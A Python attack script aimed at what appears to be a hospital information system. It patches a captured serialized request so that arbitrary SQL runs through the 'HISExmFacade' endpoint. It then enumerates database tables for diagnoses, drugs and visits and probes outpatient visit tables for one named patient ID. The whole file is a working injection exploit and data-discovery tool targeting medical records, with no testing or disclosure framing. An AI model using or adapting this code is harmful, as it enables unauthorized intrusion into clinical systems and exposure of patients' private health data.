from his_client_final import HISClient
import sys, re

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding='utf-8')

c = HISClient()

def execute_sql(sql_query):
    import zlib, os, requests
    template_path = "HISExmFacade_payload_0.bin"
    if not os.path.exists(template_path): return None
    with open(template_path, "rb") as f:
        compressed_template = f.read()
    try: decompressed = zlib.decompress(compressed_template)
    except: decompressed = compressed_template
    original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
    target_len = len(original_sql_bytes)
    padded_sql = sql_query.ljust(target_len)
    patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
    resp = requests.post(f"{c.base_url}/HISExmFacade", data=zlib.compress(patched_payload), headers=c.headers)
    if resp.status_code == 200:
        return zlib.decompress(resp.content).decode('utf-8', errors='ignore')
    return None

def parse_rows(text, tag="DRMODIFY"):
    if not text: return []
    rows = re.findall(f'<{tag}[^>]*>(.*?)</{tag}>', text, re.DOTALL)
    out = []
    for r in rows:
        fields = re.findall(r'<(\w+)>(.*?)</\1>', r)
        out.append({k: v for k, v in fields})
    return out

# Try specific owners that were found in the targeted discovery
# Owners: IMSDB, BILLING, KTHIS, VGHTC, PATH, ONLINE_SERVICE
owners = ['SYSTEM', 'OPDUSR', 'CPOE', 'IMSDB', 'BILLING']
keywords = ['%CONSULT%', '%OPD%DIAG%', '%PAT%DIAG%', '%OPD%DRUG%', '%OPD%CASE%', '%PAT%VISIT%']

print("[*] Searching ALL_OBJECTS for relevant tables...")
for kw in keywords:
    print(f"  Key: {kw}")
    q = f"SELECT OWNER, OBJECT_NAME FROM ALL_OBJECTS WHERE OBJECT_NAME LIKE '{kw}' AND OBJECT_TYPE = 'TABLE' AND ROWNUM <= 20"
    res = execute_sql(q)
    rows = parse_rows(res)
    for r in rows:
        print(f"    - {r.get('OWNER')}.{r.get('OBJECT_NAME')}")

# Probe for OPD visit specifically
target_hhisnum = "003380272B"
print(f"\n[*] Probing potential OPD visit tables for {target_hhisnum}...")
probes = ['SYSTEM.PAT_OPD_VISIT', 'OPDUSR.OPD_PAT_VISIT', 'CPOE.OPD_VISIT', 'SYSTEM.PAT_VISIT']
for p in probes:
    try:
        res = execute_sql(f"SELECT * FROM {p} WHERE HHISNUM = '{target_hhisnum}'")
        if res and '<NewDataSet>' in res:
            rows = parse_rows(res)
            print(f"  [+] {p} has records! Keys: {rows[0].keys()}")
    except: pass
